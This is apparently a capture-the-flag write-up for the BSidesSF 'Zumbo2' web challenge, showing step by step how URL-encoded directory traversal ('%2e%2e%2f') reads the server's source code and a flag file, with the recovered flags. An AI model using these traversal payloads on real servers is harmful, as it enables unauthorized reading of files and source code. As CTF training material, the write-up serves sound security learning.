Challenge: Zumbo2 
----------------------------------------
Category: Web 
----------------------------------------
100 points 
----------------------------------------

```
Description:

Welcome to ZUMBOCOM....you can do anything at ZUMBOCOM.
Three flags await. Can you find them?

http://zumbo-8ac445b1.ctf.bsidessf.net
Stage 3 - coming soon!

```


We connect to the site.

<img src="./../files/site2.png">

```
We look at the source code and find hint: <!-- page: index.template, src: /code/server.py -->

We will try a traversal directory on /code/server.py.

http://zumbo-8ac445b1.ctf.bsidessf.net/../code/server.py (../) mutliple of 1, 2, 3 etc .... don't match!
[Errno 2] No such file or directory: u'code/server.py' 

redirection: on index.template

we test null byte %00:

http://zumbo-8ac445b1.ctf.bsidessf.net/%00/code/server.py
file() argument 1 must be encoded string without null bytes, not unicode
```
<img src="./../files/erreur_null_byte.png">

We have a problem with encoded string!!!!!
. => %2e
/ => %2f

We test with:
http://zumbo-8ac445b1.ctf.bsidessf.net/%2e%2e%2f%2e%2e/code/server.py

<img src="./../files/flag1.png">

 
Bingo we have the source code and first flag !!!!!!

FLAG: FIRST_FLAG_WASNT_HARD

and we have the location of the files !!!!!!

Connect to http://zumbo-8ac445b1.ctf.bsidessf.net/%2e%2e%2f%2e%2e/flag

<img src="./../files/flag2.png">


FLAG: RUNNER_ON_SECOND_BASE 
``` 
